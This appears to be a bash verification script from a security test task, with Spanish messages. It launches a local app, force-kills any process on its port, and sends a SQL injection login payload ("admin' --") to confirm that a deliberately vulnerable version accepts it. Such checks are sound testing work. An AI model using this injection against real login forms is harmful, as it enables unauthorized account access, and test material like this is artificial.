#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
PORT="${PORT:-8054}"; export PORT
pick_free_port() {
  local p="$1"
  if command -v lsof >/dev/null 2>&1; then local pid; pid=$(lsof -nP -tiTCP:"$p" -sTCP:LISTEN 2>/dev/null || true); [ -n "$pid" ] && kill -9 $pid 2>/dev/null || true; fi
  for _ in 1 2 3; do
    if (exec 3<>"/dev/tcp/127.0.0.1/$p") 2>/dev/null; then exec 3>&- 3<&-; p=$(( (RANDOM % 2000) + 8500 )); else echo "$p"; return; fi
  done
  echo "$p"
}
PORT=$(pick_free_port "$PORT"); export PORT
python3 app.py & PID=$!
trap 'kill $PID 2>/dev/null || true' EXIT
for i in $(seq 1 60); do curl -sf -o /dev/null -X POST "http://127.0.0.1:$PORT/login" --data "username=x&password=y" && break || sleep 0.3; done
RESP=$(curl -s -X POST "http://127.0.0.1:$PORT/login" --data-urlencode "username=admin' --" --data-urlencode "password=x")
echo "respuesta: $RESP"
if echo "$RESP" | grep -q '"authenticated": true'; then
  echo "VERIFY PASS: el ataque de inyeccion tuvo exito (vulnerable confirmado)"; exit 0
else
  echo "VERIFY FAIL: el ataque no funciono en la version vulnerable"; exit 1
fi
